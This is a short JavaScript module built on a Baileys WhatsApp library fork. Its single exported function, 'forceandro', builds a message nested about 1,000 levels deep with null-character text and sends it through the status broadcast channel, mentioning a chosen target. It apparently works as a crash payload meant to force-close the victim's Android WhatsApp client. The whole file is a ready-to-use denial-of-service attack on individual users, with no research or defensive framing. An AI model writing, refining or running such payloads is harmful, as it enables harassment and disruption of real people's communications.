const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    encodeSignedDeviceIdentity,
    processTime,
    fetchLatestBaileysVersion,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function forceandro(sock, target) {
  const xqtd = (xvnx) => {
    let q = {
      conversation: "tredict"
    };

    for (let i = 0; i < xvnx; i++) {
      q = {
        extendedTextMessage: {
          text: "\0",
          contextInfo: {
            quotedMessage: q
          }
        }
      };
    }

    return q;
  };

    const message = {
      extendedTextMessage: {
        text: "\0",
        contextInfo: {
          stanzaId: Math.random().toString(36).slice(2),
          remoteJid: "\0",
          quotedMessage: {
            extendedTextMessage: {
              text: "\0",
              contextInfo: {
                quotedMessage: xqtd(1000)
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(
      "status@broadcast",
      message,
      {
        messageId: Math.random().toString(36).slice(2),
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );
}

module.exports = { forceandro };